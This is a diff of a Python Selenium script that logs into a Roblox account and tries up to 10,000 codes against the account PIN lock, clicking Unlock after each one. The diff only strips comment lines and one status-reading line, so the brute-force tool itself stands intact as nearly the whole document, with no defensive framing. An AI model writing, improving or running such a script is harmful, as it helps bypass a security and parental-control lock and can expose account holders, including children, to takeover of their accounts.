@@ -7,21 +7,21 @@
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 import time
-#############################################
+
 PATH = 'C:\temp\chromedriver.exe'
 username = input('username: ')
 password = input('password: ')
-##############################################
+
 driver = webdriver.Chrome(PATH)
 driver.get('https://www.roblox.com/my/account#!/info')
 time.sleep(1)
-###############################################
+
 first_act = driver.find_element(By.XPATH, '//*[@id="cookie-banner-wrapper"]/div[1]/div[2]/div/div/button[2]' ).click()
 username_box = driver.find_element(By.XPATH, '//*[@id="login-username"]' ).send_keys(username)
 password_box = driver.find_element(By.XPATH,  '//*[@id="login-password"]' ).send_keys(password)
 login_button = driver.find_element(By.XPATH, '//*[@id="login-button"]').click()
 time.sleep(5)
-######################################################################################################################################################
+
 pin_code_button = driver.find_element(By.XPATH, '//*[@id="settings-container"]/div[2]/div[1]/div/div[1]/span/span[1]/button').click()
 verification = driver.find_element(By.XPATH, '//*[@id="modal-body"]/form/div[2]/span')
 b = 0
@@ -33,7 +33,6 @@ for i in range(0,10000):
             pin_code_searchbox = driver.find_element(By.XPATH, '//*[@id="modal-body"]/form/div[1]/input').send_keys(pin)
             time.sleep(2) 
             Unlock_button = driver.find_element(By.XPATH, '//*[@id="rbx-body"]/div[1]/div/div/div/div[3]/button').click()
-            text = driver.find_element(By.XPATH, '//*[@id="modal-body"]/form/div[2]/span').text
             b += 1
             if b == 5:
                     b = 0
